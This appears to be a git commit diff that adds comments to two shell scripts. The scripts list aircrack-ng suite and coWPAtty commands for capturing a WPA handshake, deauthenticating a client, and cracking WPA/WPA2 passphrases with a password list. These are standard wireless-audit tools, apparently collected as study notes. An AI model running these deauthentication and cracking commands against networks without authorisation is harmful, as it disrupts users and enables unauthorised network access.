956337df7ecab37239a055b3097171ef41c2c3f6
VenusakaVXT <voxuantuan33@gmail.com>
2024-11-03 19:46:02 +0700

    Add comment

--- advanced.sh
+++ advanced.sh
@@ -1,3 +1,4 @@
+# Advanced processing after running basic aircrack-ng commands
 airodump-ng --channel 6
 airodump-ng --channel 6 --write output --bssid bssidVal wlan0mon
 aireplay-ng --deauth 6 -a bssidVal -c stationVal wlan0mon
@@ -8,5 +9,7 @@ airolib-ng crackwpa --clean all
 airolib-ng crackwpa --batch
 airolib-ng crackwpa --verify all
 
-cowpatty -s Denial_of_Service -r /root/output-01.cap -f /root/passwords.txt
+# coWPAtty Genpmk Pre computed hashes Cracking WiFi WPA WPA2
+cowpatty
 genpmk -s Denial_of_Service -d /root/output-01.cap -f /root/passwords.txt
+cowpatty -s Denial_of_Service -r /root/output-01.cap -f /root/passwords.txt
--- cowpatty.sh
+++ cowpatty.sh
@@ -1,2 +1,4 @@
+# View list options
 cowpatty
+# Crack WPA/WPA2
 cowpatty -f '../passwords.txt' -r '/root/Desktop/random-01.cap' -s "WIFI-NAME"
